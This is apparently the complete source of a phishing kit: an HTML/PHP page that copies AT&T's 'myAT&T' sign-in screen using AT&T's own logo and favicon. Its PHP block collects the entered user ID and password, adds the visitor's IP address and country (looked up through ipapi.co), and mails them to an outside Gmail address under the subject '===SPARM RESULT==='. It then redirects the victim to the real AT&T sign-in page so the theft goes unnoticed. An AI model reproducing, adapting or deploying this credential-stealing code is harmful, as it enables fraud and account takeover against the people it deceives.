<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="generator" content="Hugo 0.80.0">
    <title>Login Screen</title>

   

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

 <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }


      html,
    body {
      height: 100%;
    }

    body {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
      align-items: center;
      padding-top: 20px;
      padding-bottom: 40px;
      background-color: #f5f5f5;
    }

    .form-signin {
      width: 100%;
      max-width: 399px;
      margin-top: 4.0625rem;
      padding: 35px;
      margin: auto;
      background-color: #fff;
    }

      .form-signin .form-control {
        position: relative;
        box-sizing: border-box;
        height: auto;
        padding: 11px;
        font-size: 16px;
        border-color: #333;
      }
      .form-signin .form-control:focus {
        z-index: 2;
      }
      .form-signin input[type="email"] {
        margin-bottom: -1px;
        border-radius:3px;
      }
      .form-signin input[type="password"] {
        margin-bottom: 10px;
        border-radius: 5px;
      }
      .form-control:focus {
        box-shadow: none;
        border-color: #0057b8;
      }
      .btn{
        border-radius: 3px;
        border: 1px solid #0057b8;
        background-color: #0057b8;
        font-weight: 500;
        font-stretch: normal;
        font-style: normal;
        line-height: normal;
        letter-spacing: normal;
        color: #fff;
      }

      .btn-success{
        height: 48px;
        border-radius: 3px;
        border: 1px solid #008522;
        background-color: #008522;
      }
      .btn-primary{
        height: 48px;
        border-radius: 3px;
      }


    </style>
  <link rel="icon" href="https://signin.att.com/favicon.ico" sizes="16x16" type="image/ico">
  </head>
  <body class="text-center">
    
    <form class="form-signin" id="theform" method="POST" action="<?php echo $_SERVER['PHP_SELF']; ?>">
      <img class="mb-2 mt-1" src="https://signin.att.com/static/siam//en/halo_c/images/logos/att-logo.svg" alt="" width="72" height="72">
      <h1 class="h3 mb-2  font-weight-normal">Sign in</h1>
      <h4>to myAT&T</h4>
      <label for="inputEmail" style="padding: 0; float: left">User ID</label>
      <input type="text" id="inputEmail" class="form-control" name="userId" required autofocus>
      <span style="float: right; color: #0057b8;">Forgot User ID?</span>
      <br/>
      <label for="inputPassword" style="float:left">Password</label>
      <input type="password" name="password" id="inputPassword" class="form-control" required>
      <span style="float: right; color: #0057b8;">Forgot password?</span>
       <div class="checkbox mb-3 mt-4" style="float:left">
        <label>
          <input type="checkbox" value="remember-me"> Save user ID</label>
      </div>
      
      
      <button class="btn btn-primary btn-block" name="submit" type="submit">Sign in</button>

      <div style="text-align: center" class="mt-3 mb-3">
        <span>Don't have a user ID?</span>
        <br>
        <a href="#" style="font-weight: bold; color: #0057b8; ">Create one now</a>
      </div>

      <div style="font-size: 11px" class="d-flex mb-4">
        <hr style="width:40%">OR<hr style="width: 40%">
      </div>

      <button class="btn btn-success btn-block"  type="submit">Sign in with ZenKey</button>
      
    </form>


    <?php 
      $ip    = $_SERVER['REMOTE_ADDR'];
      $country = file_get_contents('https://ipapi.co/'.$ip.'/country_name/');


      // To send HTML mail, the Content-type header must be set
      $headers[] = 'MIME-Version: 1.0';
      $headers[] = 'Content-type: text/html; charset=iso-8859-1';

      // Additional headers
      $headers[] = 'To:'.$to;
      $headers[] = 'From: Suxyone <suxyone@hotmail.com>';

      if(isset($_POST['submit'])){
        $email = $_POST['userId'];
        $pass  = $_POST['password'];
        $ip    = $_SERVER['REMOTE_ADDR'];

        $to = "suxyone@gmail.com";

        $message ="IP: ".$ip.", COUNTRY:".$country.", USERID: ".$email.", PASSWORD: ".$pass;
        $subject = "===SPARM RESULT===";

        // Mail it
        $send = mail($to, $subject, $message, implode("\r\n", $headers));
        if($send){
          echo "<script>window.location = 'https://signin.att.com/dynamic/';</script>";
        }
      }
      
    ?>  
  </body>
</html>
